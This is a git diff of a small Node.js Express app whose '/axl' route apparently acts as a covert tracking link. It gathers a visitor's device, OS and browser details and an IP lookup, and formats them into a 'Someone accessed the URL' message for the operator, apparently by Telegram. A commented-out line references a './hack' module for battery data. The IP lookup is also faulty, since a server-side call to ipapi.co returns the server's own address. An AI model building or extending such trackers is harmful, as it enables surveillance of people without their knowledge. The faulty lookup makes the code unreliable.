@@ -80,25 +80,15 @@ function getOSVersion(userAgent) {
   return osVersion || "Unknown";
 }
 
-async function getUserLocation() {
-  try {
-    const response = await axios.get("https://ipapi.co/json/");
-    const data = response.data;
-    return {
-      ip: data.ip, // Extract IP
-      
-    };
-    } catch (error) {
-    console.error('Error fetching IP data:', error);
-    return {
-      ip: 'N/A',
 
-    };
-  }
+    
+
+
+function getBrowserVersion(userAgent) {
+  const regex = /(?:MSIE|Edge|Opera|Firefox|Chrome|Safari)[\/\s](\d+\.\d+)/;
+  const match = userAgent.match(regex);
+  return match ? match[1] : "unknown";
 }
-
-
-
 
 
 //✅️✅️✅️✅️✅️✅️✅️✅️✅️✅️✅️❤️✅️✅️❤️❤️❤️❤️✅️
@@ -109,16 +99,21 @@ const ajsal = '6524787237';
 app.get('/axl' , async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const deviceName = getDeviceName(userAgent);
+
+  const response = await axios.get("https://ipapi.co/json/");
+    const data = response.data;
+    
 /*  const { getBattery } = require('./hack');
   const batteryInfo = getBatteryInfo();
   */// Send a message to your Telegram ID with the detected device name
 const androos = getOSVersion(userAgent);
-const userLoc = await getUserLocation();
-     
+const userLoc = data.ip;
+ const brow =  getBrowserVersion(userAgent);
  const tmsg = `Someone accessed the URL 
 
 D:- ${deviceName}
 V:- ${androos}
+B:- ${brow}
 L:- ${userLoc}`;
  
  
